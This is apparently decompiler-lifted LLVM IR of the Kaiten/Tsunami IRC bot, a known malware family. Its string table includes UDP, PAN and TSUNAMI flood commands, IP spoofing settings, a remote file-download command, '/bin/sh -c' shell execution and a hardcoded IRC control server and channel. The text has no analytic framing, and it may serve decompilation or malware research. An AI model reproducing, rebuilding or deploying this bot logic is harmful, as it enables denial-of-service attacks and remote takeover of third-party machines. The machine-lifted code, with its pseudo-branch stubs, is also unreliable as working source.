source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.1 = constant i32 -352321502
@global_var_1800c.5 = global i32 0
@global_var_1801c.6 = global i32* @global_var_1800c.5
@global_var_18458.12 = global i32 0
@global_var_c094.18 = constant i32 -509558771
@global_var_18484.21 = global i32 0
@global_var_1abf8.25 = global i32 0
@global_var_1578c.27 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_18480.29 = local_unnamed_addr global i32 0
@global_var_1ad0c.31 = global i32 0
@global_var_1847c.35 = global i32 0
@global_var_157ac.37 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_157bc.39 = constant i32 114
@global_var_1abf0.41 = global i32 0
@global_var_157c0.43 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_157dc.45 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_15800.47 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_15828.49 = constant [8 x i8] c"http://\00"
@global_var_15830.51 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_15858.53 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_15880.55 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_15994.57 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_159b0.59 = constant [3 x i8] c"wb\00"
@global_var_159b4.61 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_159bc.63 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_159d4.67 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_159f4.69 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_15a24.71 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_15a44.73 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_15a5c.75 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_15a94.77 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_15aa0.79 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_15abc.82 = constant [9 x i8] c"Disabled\00"
@global_var_15ac8.84 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_15ae4.86 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_15b08.88 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_15b28.90 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_1aaf0.92 = global i32 0
@global_var_15b50.94 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_15b70.96 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_15b8c.102 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_15bac.105 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_15bc8.107 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_15be8.109 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_15c08.113 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_15c54.115 = constant [3 x i8] c".0\00"
@global_var_18884.117 = global i32 0
@global_var_15c58.120 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_15c7c.122 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_15ca4.124 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_15cc0.126 = constant i32 2
@global_var_15d10.128 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_15d38.130 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_15d50.132 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_15d74.134 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_1ad00.142 = global i32 0
@global_var_18470.144 = global i32 0
@global_var_1ad08.185 = local_unnamed_addr global i32 0
@global_var_1abf4.187 = global i32 0
@global_var_16540.208 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_1ad04.211 = local_unnamed_addr global i32 0
@global_var_16550.213 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_16560.215 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_16568.217 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_16574.222 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_18024.232 = local_unnamed_addr global i32 4
@global_var_1577c.234 = constant [16 x i8] c"wb.realunix.org\00"
@global_var_18028.235 = global [16 x i8]* @global_var_1577c.234
@global_var_165f4.238 = constant [6 x i8] c"-bash\00"
@global_var_1abfc.242 = local_unnamed_addr global i32 0
@global_var_165fc.245 = constant [7 x i8] c"#Power\00"
@global_var_16604.248 = constant [7 x i8] c"Powerk\00"
@global_var_1660c.252 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_16638.256 = constant i32 10
@global_var_165d4.258 = constant [4 x i8] c"352\00"
@global_var_180b0.259 = global [4 x i8]* @global_var_165d4.258
@global_var_1663c.261 = constant [6 x i8] c"ERROR\00"
@global_var_180f4 = external local_unnamed_addr global i32
@global_var_1aac8.268 = global i32 0
@global_var_18128.274 = global i32 0
@global_var_188a4.276 = global i32 0
@global_var_fa5c.278 = constant i32 -481296384
@global_var_cd3c.279 = constant i32 -442564544
@global_var_188a8.281 = global i32 0
@global_var_18888.283 = global i32 0
@global_var_188a0.288 = global i32 0
@global_var_16944.296 = constant [8 x i8] c"/bin/sh\00"
@global_var_1694c.298 = constant [3 x i8] c"sh\00"
@global_var_16950.300 = constant [3 x i8] c"-c\00"
@global_var_18140.307 = global i32 2
@global_var_18110.313 = global i32 0
@global_var_d44c.314 = constant i32 -442564492
@global_var_1810c.316 = global i32* bitcast (i8** @global_var_18144.264 to i32*)
@global_var_16954.322 = constant i32 0
@global_var_d60c.327 = constant i32 -382910448
@global_var_11174.328 = constant i32 -382909968
@global_var_11230.329 = constant i32 -382910224
@global_var_16988.331 = constant i32 135270416
@global_var_1696c.333 = constant [6 x i8] c"(nil)\00"
@global_var_16974.336 = constant [7 x i8] c"(null)\00"
@global_var_1697c.338 = constant i32 2949163
@global_var_16a08.341 = constant i32 16843008
@global_var_169f0.343 = constant i32 327688
@global_var_18428 = external global i32
@global_var_179b2.348 = constant i32 65536
@global_var_169e8.350 = constant [8 x i8] c" +0-#'I\00"
@global_var_16990.352 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_169d0.354 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_169c3.356 = constant i32 117506048
@global_var_169c4.358 = constant i32 252117248
@global_var_169b4.360 = constant i32 331776
@global_var_169a4.362 = constant i32 335616
@global_var_ec9c.394 = constant i32 -456978431
@global_var_16a24.398 = constant [8 x i8] c"Success\00"
@global_var_16a14.400 = constant [15 x i8] c"Unknown error \00"
@global_var_18430.402 = global i32* @global_var_179b2.348
@global_var_ec10.403 = constant i32 -369095458
@global_var_1a8ac.405 = global i32 0
@global_var_1aa7c.409 = global i32 0
@global_var_1a8b0.411 = global i32 0
@global_var_18438.413 = global i32 0
@global_var_1ad44.418 = global i32 0
@global_var_1ad38.421 = global i32 0
@global_var_1aa90.423 = global i32 0
@global_var_18330.426 = global i32 256
@global_var_18234.427 = global i32* @global_var_18330.426
@global_var_1aab8.430 = global i32 0
@global_var_1ad10.432 = global i32 0
@global_var_10f2c.433 = constant i32 -382910416
@global_var_fadc.440 = constant i32 -442564520
@global_var_1833c.442 = global i32 0
@global_var_10f84.444 = constant i32 -481230848
@global_var_1aaa8.446 = global i32 0
@global_var_10d38.448 = constant i32 -509587456
@global_var_18354.450 = global i32 0
@global_var_1836c = external global i32
@global_var_17580.469 = constant i32 0
@global_var_18408.473 = global i32 0
@global_var_1aaac.477 = local_unnamed_addr global i32 0
@global_var_d554.480 = constant i32 -382910416
@global_var_1aab4.482 = global i32 0
@global_var_18000.485 = global i32 -1
@global_var_1aabc.488 = global i32 0
@global_var_1aac0.490 = local_unnamed_addr global i32 0
@global_var_10824.491 = constant i32 -390234096
@global_var_175a8.493 = constant [10 x i8] c"/dev/null\00"
@global_var_1aac4.495 = global i32 0
@global_var_d4d4.499 = constant i32 -382909968
@global_var_1aab0.501 = local_unnamed_addr global i32 0
@global_var_18420 = external local_unnamed_addr global i32
@global_var_cc08.514 = constant i32 -442564608
@global_var_10aec.516 = constant i32 -335544701
@global_var_10c40.519 = constant i32 -275775369
@global_var_1aaec.522 = global i32 0
@global_var_1aacc.524 = global i32 0
@global_var_17bb4.528 = constant [4 x i8] c"inf\00"
@global_var_17bc8.531 = constant i32 1076101120
@global_var_17bb7.536 = constant i32 1179535616
@global_var_17bc4.538 = constant i32 2883630
@global_var_e7a0.540 = constant i32 -382908944
@global_var_1aad0.548 = global i32 0
@global_var_1aae8.553 = global i32 0
@global_var_ca18.558 = constant i32 -382910448
@global_var_1ad48.561 = global i32 0
@global_var_17c10.563 = constant i32 46
@global_var_1ad28.565 = global i32 0
@global_var_12e14.567 = constant i32 -369098656
@global_var_17c14.574 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_17c28.576 = constant i32 114
@global_var_17c2c.578 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_17c44.581 = constant [11 x i8] c"nameserver\00"
@global_var_17c50.584 = constant [7 x i8] c"domain\00"
@global_var_17c58.586 = constant [7 x i8] c"search\00"
@global_var_1ad4c.591 = global i32 0
@global_var_1ad50.593 = global i32 0
@global_var_17c74.602 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_17c60.604 = constant i32 0
@global_var_17c88.607 = constant [3 x i8] c"%x\00"
@global_var_17c8c.610 = constant [11 x i8] c"/etc/hosts\00"
@global_var_17c98.612 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_14ed4.617 = constant i32 -504313148
@global_var_14ebc.618 = constant i32 -483131392
@global_var_14d7c.619 = constant i32 -481294847
@global_var_14f34.620 = constant i32 -477821825
@global_var_15320.621 = constant i32 -516685812
@global_var_15224.622 = constant i32 -905969576
@global_var_153a0.623 = constant i32 -478149505
@global_var_15388.624 = constant i32 -534773758
@global_var_1533c.625 = constant i32 -534773758
@global_var_152d4.626 = constant i32 -483131392
@global_var_18004.628 = global i32 0
@global_var_18454.3 = external global i8*
@global_var_18474.23 = external global i8*
@global_var_18478.33 = external global i8*
@global_var_1847b.224 = external local_unnamed_addr global i8*
@global_var_1847a.225 = external local_unnamed_addr global i8*
@global_var_18479.226 = external local_unnamed_addr global i8*
@1 = internal constant [3 x i8] c" \01\00"
@global_var_18144.264 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @1, i32 0, i32 0)
@global_var_18194.265 = local_unnamed_addr global i8 16
@global_var_10838.270 = constant i8 0
@global_var_18145.319 = local_unnamed_addr global i8 1
@global_var_18195.320 = local_unnamed_addr global i8 1
@2 = internal constant [2 x i8] c"\01\00"
@global_var_18434.555 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_18435.556 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @function_8130()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @function_1572c(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @function_80b0() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_18454.3 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_18454.3 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1801c.6 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_1801c.6 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_1801c.6 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_1801c.6 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_18454.3 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_1801c.6, { 1, 0 }
  uselistorder i8** @global_var_18454.3, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @function_8124(i32 %arg1) local_unnamed_addr {
dec_label_pc_8124:
  %v0_8124 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8124, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8124
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8124, %bb
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8130() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* inttoptr (i32 98320 to i32*), align 16
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 98320

bb2:                                              ; preds = %.thread
  ret i32 98320

; uselistorder directives
  uselistorder i32 98320, { 1, 0, 2 }
}

define i32 @function_8188() local_unnamed_addr {
dec_label_pc_8188:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @function_108d8(i32 ptrtoint (i32* @global_var_c094.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 87912, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @function_fd08()
  ret i32 %v0_81bc
}

define i32 @function_81cc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_81cc:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_81d0 = load i32, i32* @r4, align 4
  %v6_81d0 = load i32, i32* @fp, align 4
  store i32 33240, i32* %stack_var_-4, align 4
  %v2_81d4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_81d4, i32* @fp, align 4
  %v2_81e8 = load i8, i8* %arg1, align 1
  %v7_81f4 = icmp eq i8 %v2_81e8, 42
  br i1 %v7_81f4, label %dec_label_pc_8228, label %dec_label_pc_81fc

dec_label_pc_81fc:                                ; preds = %dec_label_pc_81cc
  %v7_8200 = icmp eq i8 %v2_81e8, 63
  br i1 %v7_8200, label %dec_label_pc_8298, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_81fc
  %v2_820c = icmp eq i8 %v2_81e8, 0
  br i1 %v2_820c, label %dec_label_pc_8218, label %dec_label_pc_82f0

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208
  %v2_821c = load i8, i8* %tmp, align 1
  %v3_821c = zext i8 %v2_821c to i32
  br label %dec_label_pc_8364

dec_label_pc_8228:                                ; preds = %dec_label_pc_81cc
  %v1_822c = add i32 %tmp8, 1
  %v3_8238 = inttoptr i32 %v1_822c to i8*
  %v4_8238 = call i32 @function_81cc(i8* %v3_8238, i32 %arg2)
  %v2_8240 = icmp eq i32 %v4_8238, 0
  br i1 %v2_8240, label %dec_label_pc_8284, label %dec_label_pc_8248

dec_label_pc_8248:                                ; preds = %dec_label_pc_8228
  %v2_824c = load i8, i8* %tmp, align 1
  %v2_8250 = icmp eq i8 %v2_824c, 0
  br i1 %v2_8250, label %dec_label_pc_828c, label %dec_label_pc_8258

dec_label_pc_8258:                                ; preds = %dec_label_pc_8248
  %v1_825c = add i32 %arg2, 1
  %v4_8268 = call i32 @function_81cc(i8* nonnull %arg1, i32 %v1_825c)
  %v2_8270 = icmp eq i32 %v4_8268, 0
  br i1 %v2_8270, label %dec_label_pc_8284, label %dec_label_pc_828c

dec_label_pc_8284:                                ; preds = %dec_label_pc_8258, %dec_label_pc_8228
  br label %dec_label_pc_828c

dec_label_pc_828c:                                ; preds = %dec_label_pc_8248, %dec_label_pc_8258, %dec_label_pc_8284
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8284 ], [ 1, %dec_label_pc_8258 ], [ 1, %dec_label_pc_8248 ]
  br label %dec_label_pc_8364

dec_label_pc_8298:                                ; preds = %dec_label_pc_81fc
  %v2_829c = load i8, i8* %tmp, align 1
  %v2_82a0 = icmp eq i8 %v2_829c, 0
  br i1 %v2_82a0, label %dec_label_pc_82e4, label %dec_label_pc_82a8

dec_label_pc_82a8:                                ; preds = %dec_label_pc_8298
  %v1_82ac = add i32 %tmp8, 1
  %v1_82b4 = add i32 %arg2, 1
  %v2_82c0 = inttoptr i32 %v1_82ac to i8*
  %v3_82c0 = call i32 @function_81cc(i8* %v2_82c0, i32 %v1_82b4)
  %v2_82c8 = icmp ne i32 %v3_82c0, 0
  %. = zext i1 %v2_82c8 to i32
  br label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82a8, %dec_label_pc_8298
  %storemerge2 = phi i32 [ 1, %dec_label_pc_8298 ], [ %., %dec_label_pc_82a8 ]
  br label %dec_label_pc_8364

dec_label_pc_82f0:                                ; preds = %dec_label_pc_8208
  %v2_82f4 = load i8, i8* %arg1, align 1
  %v3_82f4 = zext i8 %v2_82f4 to i32
  %v1_82fc = call i32 @function_cbd4(i32 %v3_82f4)
  store i32 %v1_82fc, i32* @r4, align 4
  %v2_8308 = load i8, i8* %tmp, align 1
  %v3_8308 = zext i8 %v2_8308 to i32
  %v1_8310 = call i32 @function_cbd4(i32 %v3_8308)
  %v0_8318 = load i32, i32* @r4, align 4
  %v9_8318 = icmp eq i32 %v0_8318, %v1_8310
  br i1 %v9_8318, label %dec_label_pc_8320, label %dec_label_pc_835c

dec_label_pc_8320:                                ; preds = %dec_label_pc_82f0
  %v1_8324 = add i32 %tmp8, 1
  %v1_832c = add i32 %arg2, 1
  %v2_8338 = inttoptr i32 %v1_8324 to i8*
  %v3_8338 = call i32 @function_81cc(i8* %v2_8338, i32 %v1_832c)
  %v2_8340 = icmp ne i32 %v3_8338, 0
  %.7 = zext i1 %v2_8340 to i32
  br label %dec_label_pc_835c

dec_label_pc_835c:                                ; preds = %dec_label_pc_8320, %dec_label_pc_82f0
  %storemerge = phi i32 [ 1, %dec_label_pc_82f0 ], [ %.7, %dec_label_pc_8320 ]
  br label %dec_label_pc_8364

dec_label_pc_8364:                                ; preds = %dec_label_pc_82e4, %dec_label_pc_828c, %dec_label_pc_8218, %dec_label_pc_835c
  %stack_var_-44.0 = phi i32 [ %storemerge3, %dec_label_pc_828c ], [ %storemerge2, %dec_label_pc_82e4 ], [ %v3_821c, %dec_label_pc_8218 ], [ %storemerge, %dec_label_pc_835c ]
  store i32 %v3_81d0, i32* @r4, align 4
  store i32 %v6_81d0, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32)* @function_cbd4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_8364, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_828c, { 2, 1, 0 }
}

define i32 @function_8374(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8374:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8374 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8374, i32* @ip, align 4
  %v6_8378 = load i32, i32* @r2, align 4
  store i32 %v6_8378, i32* %stack_var_-8, align 4
  %v3_837c = load i32, i32* @fp, align 4
  store i32 33668, i32* %stack_var_-16, align 4
  %v2_8380 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8380, i32* @fp, align 4
  %v4_8390 = ptrtoint i32* %stack_var_-8 to i32
  store i32 ptrtoint (i32* @global_var_18484.21 to i32), i32* @r0, align 4
  %v3_83a4 = call i32 @function_cda0(i32 ptrtoint (i32* @global_var_18484.21 to i32), i32 %arg2, i32 %v4_8390)
  store i32 ptrtoint (i32* @global_var_18484.21 to i32), i32* @r0, align 4
  %v0_83ac = call i32 @function_ecc0()
  store i32 %v0_83ac, i32* @r2, align 4
  %v3_83c0 = call i32 @function_cba8(i32 %arg1, i32* nonnull @global_var_18484.21)
  store i32 %v3_837c, i32* @fp, align 4
  ret i32 %v3_83c0

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_18484.21 to i32), { 1, 0, 2 }
}

define i32 @function_83d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_83d8:
  %stack_var_-4 = alloca i32, align 4
  %v3_83dc = load i32, i32* @fp, align 4
  store i32 33764, i32* %stack_var_-4, align 4
  %v2_83e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_83e0, i32* @fp, align 4
  %v2_83f0 = load i8, i8* bitcast (i8** @global_var_18474.23 to i8*), align 4
  %v7_83f4 = icmp eq i8 %v2_83f0, 1
  br i1 %v7_83f4, label %dec_label_pc_83fc, label %dec_label_pc_8420

dec_label_pc_83fc:                                ; preds = %dec_label_pc_83d8
  %v2_8400 = load i32, i32* @global_var_1abf8.25, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_8410 = call i32 @function_8374(i32 %v2_8400, i32 ptrtoint ([30 x i8]* @global_var_1578c.27 to i32))
  br label %dec_label_pc_8524

dec_label_pc_8420:                                ; preds = %dec_label_pc_83d8
  %v1_8420 = call i32 @function_ca44(i32 %arg1)
  %v2_8430 = icmp eq i32 %v1_8420, 0
  br i1 %v2_8430, label %dec_label_pc_8438, label %dec_label_pc_8444

dec_label_pc_8438:                                ; preds = %dec_label_pc_8420
  br label %dec_label_pc_8524

dec_label_pc_8444:                                ; preds = %dec_label_pc_8420
  %v2_8448 = load i32, i32* @global_var_18480.29, align 4
  %v1_844c = add i32 %v2_8448, 1
  store i32 %v1_844c, i32* @global_var_18480.29, align 4
  %v3_8460 = mul i32 %v1_844c, 4
  %v1_8464 = add i32 %v3_8460, 4
  %v1_846c = call i32 @function_f908(i32 %v1_8464)
  %v2_84c812 = load i32, i32* @global_var_18480.29, align 4
  %v9_84d414 = icmp eq i32 %v2_84c812, 1
  br i1 %v9_84d414, label %dec_label_pc_84dc, label %dec_label_pc_8484

dec_label_pc_8484:                                ; preds = %dec_label_pc_8444, %dec_label_pc_8484
  %storemerge116 = phi i32 [ %v1_84bc, %dec_label_pc_8484 ], [ 0, %dec_label_pc_8444 ]
  %v3_8488 = mul i32 %storemerge116, 4
  %v2_8494 = add i32 %v3_8488, %v1_846c
  %v2_84a8 = load i32, i32* @global_var_1ad0c.31, align 4
  %v2_84ac = add i32 %v2_84a8, %v3_8488
  %v1_84b0 = inttoptr i32 %v2_84ac to i32*
  %v2_84b0 = load i32, i32* %v1_84b0, align 4
  %v2_84b4 = inttoptr i32 %v2_8494 to i32*
  store i32 %v2_84b0, i32* %v2_84b4, align 4
  %v1_84bc = add i32 %storemerge116, 1
  %v2_84c8 = load i32, i32* @global_var_18480.29, align 4
  %v1_84cc = add i32 %v2_84c8, -1
  %tmp = icmp ugt i32 %v1_84cc, %v1_84bc
  br i1 %tmp, label %dec_label_pc_8484, label %dec_label_pc_84c4.dec_label_pc_84dc_crit_edge

dec_label_pc_84c4.dec_label_pc_84dc_crit_edge:    ; preds = %dec_label_pc_8484
  br label %dec_label_pc_84dc

dec_label_pc_84dc:                                ; preds = %dec_label_pc_8444, %dec_label_pc_84c4.dec_label_pc_84dc_crit_edge
  %v2_84c8.lcssa = phi i32 [ %v2_84c8, %dec_label_pc_84c4.dec_label_pc_84dc_crit_edge ], [ %v2_84c812, %dec_label_pc_8444 ]
  %v3_84e4 = mul i32 %v2_84c8.lcssa, 4
  %v2_84f0 = add i32 %v1_846c, -4
  %v1_84f4 = add i32 %v2_84f0, %v3_84e4
  %v2_84fc = inttoptr i32 %v1_84f4 to i32*
  store i32 %v1_8420, i32* %v2_84fc, align 4
  %v2_8504 = load i32, i32* @global_var_1ad0c.31, align 4
  %v1_850c = call i32 @function_fa5c(i32 %v2_8504)
  store i32 %v1_846c, i32* @global_var_1ad0c.31, align 4
  br label %dec_label_pc_8524

dec_label_pc_8524:                                ; preds = %dec_label_pc_8438, %dec_label_pc_83fc, %dec_label_pc_84dc
  %v3_8524 = phi i32 [ 0, %dec_label_pc_8438 ], [ 1, %dec_label_pc_83fc ], [ %v1_8420, %dec_label_pc_84dc ]
  store i32 %v3_83dc, i32* @fp, align 4
  ret i32 %v3_8524

; uselistorder directives
  uselistorder i32 %v3_8488, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_84c812, { 1, 0 }
  uselistorder i32 %v1_846c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8524, { 2, 0, 1 }
  uselistorder label %dec_label_pc_84dc, { 1, 0 }
